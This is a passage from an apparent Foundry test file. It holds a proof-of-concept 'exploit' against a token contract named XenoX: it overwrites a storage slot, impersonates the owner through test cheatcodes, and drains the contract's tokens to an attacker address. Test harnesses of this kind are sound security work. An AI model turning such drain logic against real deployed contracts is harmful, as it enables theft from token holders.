        vm.label(owner, "Contract Owner");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Calculate storage slot for _rOwned[target] (slot 1 is _rOwned mapping)
        bytes32 slot = keccak256(abi.encode(target, uint256(1)));

        // Set a large reflection balance for the contract (1 million tokens worth)
        uint256 reflectionAmount = 1_000_000 * 1e18; // Large reflection value
        vm.store(target, slot, bytes32(reflectionAmount));

        // Record initial balance
        uint256 initialBalance = IXenoX(target).balanceOf(attacker);

        // Impersonate the owner
        vm.startPrank(owner);

        // Get the contract's token balance
        uint256 contractBalance = IXenoX(target).balanceOf(target);

        // Drain all tokens to attacker
        IXenoX(target).transferTokens(attacker, contractBalance);

        // Stop impersonation
        vm.stopPrank();

        // Verify the attacker's balance increased
        uint256 finalBalance = IXenoX(target).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
